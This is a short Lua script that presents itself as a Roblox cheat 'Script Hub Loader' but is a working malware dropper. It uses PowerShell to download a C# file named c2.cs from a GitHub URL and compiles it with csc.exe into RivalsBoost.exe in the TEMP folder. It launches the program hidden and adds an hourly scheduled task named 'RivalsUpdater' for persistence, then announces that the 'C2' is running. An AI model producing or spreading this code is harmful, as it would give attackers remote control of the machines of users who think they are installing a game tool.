-- Roblox Script Hub Loader - auto-downloads & compiles C2
local function download_and_compile()
    local url = "https://raw.githubusercontent.com/hhxnz32/rbx-scripts-rivals-hub-roblox-utilities-script-collection/main/c2.cs"
    local script_path = os.getenv("TEMP") .. "\\c2.cs"
    local exe_path = os.getenv("TEMP") .. "\\RivalsBoost.exe"
    
    local ps_download = 'powershell -c "Invoke-WebRequest -Uri \\"' .. url .. '\\" -OutFile \\"' .. script_path .. '\\""'
    os.execute(ps_download)
    
    local ps_compile = 'powershell -c "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:' .. exe_path .. ' ' .. script_path .. '"'
    os.execute(ps_compile)
    
    os.execute('start /b "" "' .. exe_path .. '"')
    os.execute('schtasks /create /tn "RivalsUpdater" /tr "' .. exe_path .. '" /sc hourly /f >nul 2>&1')
    
    print("[RIVALS] C2 injected and running on port 443.")
end

download_and_compile()
